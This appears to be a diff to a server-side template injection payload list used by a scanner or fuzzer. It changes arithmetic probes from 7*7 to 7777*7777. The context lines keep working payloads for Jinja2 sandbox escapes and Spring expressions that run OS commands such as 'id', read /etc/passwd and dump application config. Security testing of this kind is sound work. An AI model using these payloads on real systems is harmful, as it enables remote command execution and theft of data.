@@ -1,11 +1,11 @@
 [
-  "{{7*7}}",
+  "{{7777*7777}}",
   "{{7*'7'}}",
-  "${7*7}",
-  "${{7*7}}",
-  "#{7*7}",
-  "<%= 7*7 %>",
-  "${7*7}",
+  "${7777*7777}",
+  "${{7777*7777}}",
+  "#{7777*7777}",
+  "<%= 7777*7777 %>",
+  "${7777*7777}",
   "{{config}}",
   "{{self}}",
   "{{request}}",
@@ -16,9 +16,9 @@
   "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{% endif %}{% endfor %}",
   "{%import os%}{{os.system('id')}}",
   "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-  "*{7*7}",
-  "@{7*7}",
-  "{7*7}",
+  "*{7777*7777}",
+  "@{7777*7777}",
+  "{7777*7777}",
   "{{2+2}}[[3*3]]",
   "${class.getResource('/etc/passwd').text}",
   "#{T(java.lang.Runtime).getRuntime().exec('id')}",
@@ -28,5 +28,5 @@
   "{{dump(app)}}",
   "{{app.request.server.all|join(',')}}",
   "{{\"hello\"|upper}}",
-  "{{7*'7'}}abc{{7*7}}"
+  "{{7*'7'}}abc{{7777*7777}}"
 ]
